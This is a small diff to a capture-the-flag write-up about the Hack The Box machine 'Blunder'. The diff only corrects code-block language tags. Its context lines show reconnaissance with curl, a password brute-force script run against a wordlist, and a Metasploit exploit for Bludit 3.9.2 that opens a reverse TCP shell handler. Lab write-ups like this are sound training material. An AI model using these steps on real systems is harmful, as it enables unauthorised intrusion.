@@ -38,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds
 
 The X-Powered-By header reveals the site is running on `Bludit CMS`:
 
-```bassh
+```bash
 a3nk17@kali:~/htb/blunder$ curl -v http://blunder.htb
 *   Trying 10.10.10.191:80...
 * TCP_NODELAY set
@@ -144,7 +144,7 @@ and with `wfuzz` i got 2more directories
 
 ![](/assets/img/posts/blunder/4.png)
 
-```
+```bash
 a3nk17@kali:~/htb/blunder$ chmod +x b.py 
 snowscan@kali:~/htb/blunder$ ./b.py cewl.txt
 [*] Trying: CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
@@ -193,7 +193,7 @@ Exploit target:
    0   Bludit v3.9.2
 ```
 
-```
+```bash
 msf5 exploit(linux/http/bludit_upload_images_exec) > run
 
 [*] Started reverse TCP handler on 10.10.14.29:80 
